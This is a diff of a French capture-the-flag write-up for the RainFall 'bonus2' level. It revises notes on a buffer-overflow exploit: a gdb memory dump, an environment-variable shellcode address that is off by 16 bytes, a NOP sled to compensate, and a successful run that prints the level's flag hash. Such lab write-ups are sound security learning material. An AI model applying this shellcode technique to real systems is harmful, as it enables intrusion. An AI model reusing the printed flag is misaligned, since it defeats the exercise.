@@ -318,15 +318,12 @@ gs             0x33     51
 0xbfffff19:     0x65    0x72    0x2f    0x62
 (gdb)
 
-ce n'est pas mon shellcode stocker dans 0xbfffff09
+ce n'est pas le debut de mon shellcode stocker dans 0xbfffff09 c'est 16 octets plus tard
+gdb et les argv chjange les adresses des var d'env
 
-bonus2@RainFall:~$ /tmp/a.out
-0xbfffff03
-bonus2@RainFall:~$
-
-apres changement de l'adresse dans le script 
+il faut donc ajouter des nops pour s'assurer de tomber sur notre shellcode
 
 bonus2@RainFall:~$ ./bonus2 "$(cat /tmp/payload1)" "$(cat /tmp/payload2)"
-Goedemiddag! aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbb���
-Segmentation fault (core dumped)
+Goedemiddag! aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbb����
+71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
 bonus2@RainFall:~$
